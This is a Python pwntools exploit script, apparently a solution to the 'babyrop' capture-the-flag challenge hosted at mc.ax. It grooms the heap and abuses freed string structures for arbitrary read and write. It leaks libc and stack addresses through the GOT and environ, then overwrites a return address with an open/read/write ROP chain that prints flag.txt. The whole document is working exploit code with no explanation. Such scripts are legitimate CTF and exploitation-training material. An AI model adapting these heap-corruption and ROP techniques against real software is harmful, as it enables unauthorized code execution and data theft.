#!/usr/bin/env python3

from pwn import *

exe = ELF("./babyrop", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

context.binary = exe
context.log_level = 'debug'

def create(index, length, data):
    p.sendlineafter(b'command:', b'C')
    p.sendlineafter(b'enter your index:', '{}'.format(index).encode())
    p.sendlineafter(b'How long is your safe_string:', '{}'.format(length).encode())
    p.sendafter(b'enter your string:', data)

def free(index):
    p.sendlineafter(b'command:', b'F')
    p.sendlineafter(b'enter your index:', '{}'.format(index).encode())

def read(index):
    p.sendlineafter(b'command:', b'R')
    p.sendlineafter(b'enter your index:', '{}'.format(index).encode())
    return p.recvuntil(b'enter')

def write(index, data):
    p.sendlineafter(b'command:', b'W')
    p.sendlineafter(b'index:', '{}'.format(index).encode())
    p.sendafter(b'enter your string:', data)

def DEBUG(command=''):
    command='''
    b*0x000000000040164b
    b*0x0000000000401499
    b*0x000000000040148d
    b*0x00000000004015c3
    b*0x0000000000401563
    b*main+367
    c
    search-pattern flag.txt
    '''
    with open('/tmp/command.gdb', 'wt') as f:
        f.write(command)
    subprocess.Popen(['/usr/bin/x-terminal-emulator', '-e', 'gdb', '-p', str(pidof(p)[0]), '-x', '/tmp/command.gdb'])
    input()         # input() to make program wait with gdb

# p = process('./babyrop')
p = connect('mc.ax', 31245)

#############################
### Stage 1: Leak address ###
#############################
print('------ Stage 1: Leak address ------')
offset = 0x140
for i in range(10):
    create(i, 0x40, '{}'.format(i).encode()*8)
for i in range(10):
    free(i)
create(0, 0x420, b'0*8')

# chunk 0 control string data --> change struct of chunk 7
# leak address
write(0, flat(0x8, exe.got['puts']))
puts_leak = read(7).split(b'\n')[1].decode().split(' ')[::-1][2:-1]
puts_leak = int(''.join([i for i in puts_leak]), 16)
print('[+] Leak puts address:', hex(puts_leak))
libc.address = puts_leak - libc.sym['puts']
print('[*] Libc base:', hex(libc.address))
print('[*] Environ address:', hex(libc.sym['environ']))
write(0, flat(0x8, libc.sym['environ']))
stack_addr = read(7).split(b'\n')[1].decode().split(' ')[::-1][2:-1]
stack_addr = int(''.join([i for i in stack_addr]), 16)
print('[+] Environment stack address:', hex(stack_addr))
return_addr = stack_addr - offset
print('[*] Return address:', hex(return_addr))

##############################################
### Stage 2: Create ROP chain and get flag ###
##############################################
print('------ Stage 2: Get flag ------')
pop_rdx_ret = libc.address + 0x00000000000d9c2d
pop_rdi_ret = libc.address + 0x000000000002d7dd
pop_rsi_ret = libc.address + 0x000000000002eef9
xchg_eax_edi_ret = libc.address + 0x000000000014683c

str_flag = return_addr + 0x70
str_flag_context = str_flag + 0x8
rop = flat(pop_rdi_ret, str_flag, pop_rsi_ret, 0, libc.sym['open'])
rop += flat(xchg_eax_edi_ret, pop_rsi_ret, str_flag_context, pop_rdx_ret, 0x200, libc.sym['read'])
rop += flat(pop_rdi_ret, 1, libc.sym['write'])
rop += flat(b'flag.txt\x00')

write(0, flat(len(rop), return_addr))
write(7, rop)

p.sendlineafter(b'command:', b'E')
p.sendlineafter(b'enter your index:', b'0')

p.interactive()